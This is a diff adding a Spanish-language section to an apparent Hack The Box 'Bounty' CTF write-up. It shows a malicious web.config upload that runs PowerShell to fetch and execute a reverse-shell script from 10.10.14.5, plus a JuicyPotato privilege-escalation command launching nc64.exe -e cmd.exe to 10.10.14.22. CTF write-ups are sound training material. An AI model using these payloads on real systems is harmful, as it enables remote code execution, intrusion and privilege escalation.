@@ -121,6 +121,52 @@ Quitamos esa opcion. Si queremos que nos saque una frase cosa que veo ya inecesa
 ![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/c85ba7ee-5e0c-4567-9eb0-7a704f16e08e)
 
 
+## RCE
+
+Entonces en este punto ya sabemos que se puede subir una extencion .config por lo que vamos a subir un web.config con una reverseshell.
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+    <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+</configuration>
+<%@ Language=VBScript %>
+<%
+  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')")
+%>
+```
+
+![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/a07d1f8f-3ce1-43cd-b514-8f956b4581db)
+
+
+Con esto ganamos acceso a la maquina y ya sabes haciendo una enumeracion vemos el privilegio de SetImpersonate. Algo a destacar la flag estaba escondida como archivo oculto. usa las opciones /a:h tanto como para buscar como para listar.
+
+### JuicePotato
+
+La manera mas facil de escalar privilegios.
+
+```
+.\JuicyPotato.exe -t * -l 1337 -p cmd.exe -a "/c C:\Windows\Temp\Privesc\nc64.exe -e cmd.exe 10.10.14.22 1234" -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"
+
+```
+
+![image](https://github.com/gecr07/Bounty-HTB/assets/63270579/4d86d65b-f0b9-4819-a76a-4390e58a2420)
+
+
 
 
 
